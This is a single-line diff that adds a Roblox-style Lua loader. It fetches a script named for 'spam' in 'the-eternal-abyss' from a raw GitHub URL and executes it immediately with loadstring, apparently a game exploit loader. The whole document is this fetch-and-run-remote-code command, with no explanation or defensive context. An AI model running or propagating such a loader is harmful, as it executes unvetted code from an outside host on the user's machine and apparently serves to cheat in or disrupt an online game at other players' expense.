@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/the-eternal-abyss-spam6-1xpwuzc6jdyif8.lua"))()
